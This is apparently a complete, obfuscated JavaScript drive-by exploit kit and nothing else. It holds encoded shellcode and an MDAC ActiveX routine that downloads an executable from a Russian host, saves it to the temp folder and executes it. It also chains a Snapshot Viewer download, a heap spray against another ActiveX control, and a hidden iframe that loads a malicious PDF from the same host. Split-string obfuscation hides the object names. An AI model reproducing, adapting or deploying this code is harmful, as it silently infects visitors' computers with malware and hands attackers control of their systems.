var shellco='%u9090%u9'+'090%u54eb%u758b%'+
'u8b3c%u3574%u0378%u56f5%u768b%u0320%u33f5%u49c9%ua'+
'd41%udb33%u0f36%u14be%u3828%'+
'u74f2%uc108%u0dcb%uda03%ueb40%u3bef%u75df%u5e'+
'e7%u5e8b%u0324%u66dd%u0c8b%u8b4b%u1c5e%udd03%u048b%u038'+
'b%uc3c5%u7275%u6d6c%u6e6f%u642e%u6c6c%u4'+
'300%u5c3a%u2e55%u7865%u0065%uc033%u0364%u3040%u0c78%u4'+
'08b%u8b0c%u1c70%u8bad%u0840%u09eb%u408'+
'b%u8d34%u7c40%u408b%u953c%u8ebf%u0e4e%ue8ec%uff84%'+
'uffff%uec83%u8304%u242c%uff3c%u95d0%ubf50%u1a36%u702f%u6fe8%'+
'uffff%u8bff%u2454%u8dfc%uba52%udb33%u5353%ueb52%'+
'u5324%ud0ff%ubf5d%ufe98%u0e8a%u53e8%uffff%u83ff%u04ec%u2c83'+
'%u6224%ud0ff%u7ebf%ue2d8%ue873%uff40%uffff%uff'+
'52%ue8d0%uffd7%uffff%u7468%u7074%u2f3a%u6f2f%u746e%u6c69'+
'%u706f%u722e%u2f75%u2e2e%u2f2e%u6966%u656c%u2e34%u7865%u6565';
function sleep(func,naptime){
	//naptime = naptime * 1000;
	var sleeping = true;
	var now = new Date();
	var alarm;
	var startingMSeconds = now.getTime();
	while(sleeping){
		alarm = new Date();
		alarmMSeconds = alarm.getTime();
		if(alarmMSeconds - startingMSeconds > naptime){ sleeping = false; }
	}
	eval(func);
}
var url='http://ontilop.ru/.../file1.exe';
var success=0;
var exeurl=url;
function CreateO(o,n){
	var r=null;
	try{r=o.CreateObject(n)}catch(e){}
	if(!r){try{r=o.CreateObject(n,"")}catch(e){}}
	if(!r){try{r=o.CreateObject(n,"","")}catch(e){}}
	if(!r){try{r=o.GetObject("",n)}catch(e){}}
	if(!r){try{r=o.GetObject(n,"")}catch(e){}}
	if(!r){try{r=o.GetObject(n)}catch(e){}}
	return(r);
}
var repl=new Array("-","ip","il","te","je","el","ca","ec","ol","os","LH","SX","ve","DO","re","od","pe","it","cl");
function Go(a){
	var fso=a.CreateObject("Scr"+repl[1]+"ting.F"+repl[2]+"eSys"+repl[3]+"mOb"+repl[4]+"ct","")
	var sap=CreateO(a,"Sh"+repl[5]+"l.Appli"+repl[6]+"tion");
	var nl=null;
	fname="785.exe";
	fname=eval("fso.Bu"+repl[2]+"dPath(fso.GetSp"+repl[7]+"ialF"+repl[8]+"der(2),fname)");
	try{nl=CreateO(a,"Micr"+repl[9]+"oft.XM"+repl[10]+"TTP");nl.open("GET",exeurl,false);}
catch(e){try{nl=CreateO(a,"M"+repl[11]+"ML2.XM"+repl[10]+"TTP");nl.open("GET",exeurl,false);}
catch(e){try{nl=CreateO(a,"M"+repl[11]+"ML2.Ser"+repl[12]+"rXM"+repl[10]+"TTP");nl.open("GET",exeurl,false);}
catch(e){try{nl=new XMLHttpRequest();nl.open("GET",exeurl,false);}
catch(e){return 0;}}}}
	nl.send(null);
	rb=nl.responseBody;
	var x=CreateO(a,"A"+repl[13]+"DB.St"+repl[14]+"am");
	x.Type=1;
	eval("x.M"+repl[15]+"e=3;x.O"+repl[16]+"n();x.Wr"+repl[17]+"e(rb);x.Sa"+repl[12]+"Tof"+repl[2]+"e(fname,2);sap.Sh"+repl[5]+"lEx"+repl[7]+"ute(fname);");
	return 1;
}
function mdac(){
	var i=0;
	var target=new Array("BD96C556"+repl[0]+"65A3-11D0-983A-00C04FC29E36","AB9BCEDD"+repl[0]+"EC7E-47E1-9322-D4A210617116","0006F033"+repl[0]+"0000-0000-C000-000000000046","0006F03A"+repl[0]+"0000-0000-C000-000000000046","6e32070a"+repl[0]+"766d-4ee6-879c-dc1fa91d2fc3","6414512B"+repl[0]+"B978-451D-A0D8-FCFDF33E833C","7F5B7F63"+repl[0]+"F06F-4331-8A26-339E03C0AE3D","06723E09"+repl[0]+"F4C2-43c8-8358-09FCD1DB0766","639F725F"+repl[0]+"1B2D-4831-A9FD-874847682010","BA018599"+repl[0]+"1DB3-44f9-83B4-461454C84BF8","D0C07D56"+repl[0]+"7C69-43F1-B4A0-25F5A11FAB19","E8CCCDDF"+repl[0]+"CA28-496b-B050-6C07C962476B",null);
	while(target[i]){
		var a=null;
		a=document.createElement("object");
		a.setAttribute(repl[18]+"assid",repl[18]+"sid:"+target[i]);
		if(a){try{var b=CreateO(a,"Sh"+repl[5]+"l.Appli"+repl[6]+"tion");if(b){if(Go(a))return 1;}}catch(e){}}
		i++;
	}
}
if(mdac());
if(!success){
	sleep("acs()",1500)
}
function acs()
{
	var sfrom = 'http://ontilop.ru/.../file2.exe';
	try{
		var obj = document.createElement("object");
		obj.setAttribute("classid", "clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9");
		obj.setAttribute("id", "obj");
		obj.SnapshotPath = sfrom;
		obj.CompressedPath = 'C:\path.exe';
		obj.PrintSnapshot();
	}
	catch(e) {}
	sleep("real()",2000);
}
function real()
{
	var repq=new Array("cl","-");
	try{
		obj=document.createElement("object");
		obj.setAttribute(repq[0]+"assid",repq[0]+"sid:2F542A2E"+repq[1]+"EDC9-4BF7-8CB1-87C9919F7F93");
		var mystring=unescape(shellco);
		var myvar = unescape("%u"+noc+noc+"%u"+noc+noc);
		var bblock = myvar;
		var sspace = 20 + mystring.length;
		while (bblock.length < sspace) bblock += bblock;
		var fblock = bblock.substring(0,sspace);
		var block = bblock.substring(0,bblock.length - sspace);
		while (block.length + sspace < 0x40000) block = block + block + fblock;
		var mem = new Array();
		for (i=0; i<400; i++) mem[i]=block+mystring;
		var buf = '';
		while (buf.length < 32) buf = buf + unescape("%"+noc);
		var m = '';
		m = obj.Console;
		obj.Console = buf;
		obj.Console = m;
		m = obj.Console;
		obj.Console = buf;
		obj.Console = m;
	}
	catch(e){}
	sleep("pdf()",2000);
}
function pdf()
{
	document.write('<iframe src="http://ontilop.ru/.../sploits/test.pdf" width=1 height=1 style="display:none"></iframe>');
}ILIIL="NaN";